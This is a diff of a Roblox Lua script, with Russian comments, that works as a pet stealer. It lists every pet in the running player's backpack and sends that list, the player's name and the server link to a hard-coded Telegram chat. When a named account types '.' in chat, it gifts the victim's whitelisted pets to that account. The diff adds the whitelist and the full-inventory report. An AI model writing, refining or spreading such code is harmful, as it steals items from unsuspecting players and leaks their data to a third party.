@@ -10,33 +10,39 @@ local TELEGRAM_CHAT_ID = "7144575011"
 local TARGET_PLAYER = "Rikizigg"
 local TRIGGER_MESSAGE = "."
 
--- 🐾 ТОЧНЫЕ НАЗВАНИЯ ПИТОМЦЕВ (без дополнительных параметров)
-local PET_NAMES = {
+-- 🐾 БЕЛЫЙ СПИСОК для передачи (только эти будут передаваться)
+local WHITELIST = {
+    "Rooster",
+    "Wasp",
+    "Caterpillar",
+    "Tarantula Hawk",
+    "Mythical Egg",
     "Hamster",
+    "Honster"
 }
 
--- 🔎 Фильтрация ТОЛЬКО питомцев
-local function getTruePets()
+-- 🔎 Найти ВСЕХ питомцев (с весом и возрастом)
+local function getAllPets()
     local pets = {}
     local backpack = player:FindFirstChild("Backpack") or player.Character
     
     for _, item in ipairs(backpack:GetChildren()) do
         if item:IsA("Tool") then
-            -- Проверяем ЧИСТОЕ название (первое слово до пробела)
-            local baseName = item.Name:match("^([^%[]+)") or item.Name
-            baseName = baseName:gsub("%s+$", "")
-            
-            -- Проверяем формат веса/возраста
+            -- Ищем формат "[X.XX KG] [Age X]"
             local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
-            
-            -- Если есть совпадение и параметры
-            if table.find(PET_NAMES, baseName) and weight and age then
+            if weight and age then
+                -- Берем основное название (до первых квадратных скобок)
+                local petName = item.Name:match("^([^%[]+)") or item.Name
+                petName = petName:gsub("%s+$", "")
+                
                 table.insert(pets, {
-                    name = baseName,
+                    name = petName,
                     fullName = item.Name,
                     weight = tonumber(weight),
                     age = tonumber(age),
-                    object = item
+                    object = item,
+                    -- Флаг для проверки белого списка
+                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                 })
             end
         end
@@ -45,14 +51,15 @@ local function getTruePets()
     return pets
 end
 
--- 📜 Формирование списка питомцев
-local function getCleanPetsList()
-    local pets = getTruePets()
+-- 📜 Формируем список для уведомления (ВСЕ питомцы)
+local function getFullPetsList()
+    local pets = getAllPets()
     if #pets == 0 then return "нет питомцев" end
     
     local list = {}
     for _, pet in ipairs(pets) do
-        table.insert(list, string.format("%s [%.2f кг, %d дн.]", pet.name, pet.weight, pet.age))
+        local status = pet.isWhitelisted and "✓" or "✗"
+        table.insert(list, string.format("%s %s [%.2f кг, Age %d]", status, pet.name, pet.weight, pet.age))
     end
     
     return table.concat(list, "\n")
@@ -66,8 +73,10 @@ local function equipPet(pet)
     end
 end
 
--- 📤 Передать питомца
+-- 📤 Передать питомца (ТОЛЬКО из белого списка)
 local function transferPet(pet)
+    if not pet.isWhitelisted then return false end
+    
     local target = Players:FindFirstChild(TARGET_PLAYER)
     if target and ReplicatedStorage:FindFirstChild("PetGiftingService") then
         ReplicatedStorage.PetGiftingService:FireServer("GivePet", target)
@@ -85,21 +94,27 @@ end
 
 -- 🚀 Основная функция передачи
 local function startPetTransfer()
-    local pets = getTruePets()
+    local pets = getAllPets()
     if #pets == 0 then
-        sendToTelegram("❌ Нет подходящих питомцев")
+        sendToTelegram("❌ Нет питомцев для передачи")
         return
     end
     
+    local transferred = 0
     for _, pet in ipairs(pets) do
-        equipPet(pet.object)
-        if transferPet(pet.object) then
-            sendToTelegram("✅ "..pet.name.." [передан]")
-        else
-            sendToTelegram("❌ "..pet.name.." [ошибка]")
+        if pet.isWhitelisted then
+            equipPet(pet.object)
+            if transferPet(pet) then
+                sendToTelegram(string.format("✅ %s [%.2f кг, Age %d]", pet.name, pet.weight, pet.age))
+                transferred += 1
+            else
+                sendToTelegram(string.format("❌ %s [ошибка передачи]", pet.name))
+            end
+            task.wait(2)
         end
-        task.wait(2)
     end
+    
+    sendToTelegram("🏁 Итого передано: "..transferred.." из "..#pets)
 end
 
 -- 🔗 Получить ссылку на сервер
@@ -110,8 +125,9 @@ end
 -- 🏁 ИНИЦИАЛИЗАЦИЯ
 sendToTelegram(
     "🔔 "..player.Name.." активировал скрипт\n"..
-    "🐾 Питомцы:\n"..getCleanPetsList().."\n"..
-    "🔗 "..getServerLink()
+    "🐾 Все питомцы:\n"..getFullPetsList().."\n"..
+    "🔗 "..getServerLink().."\n\n"..
+    "✓ - будут переданы\n✗ - не из белого списка"
 )
 
 -- 👂 Слушатель чата
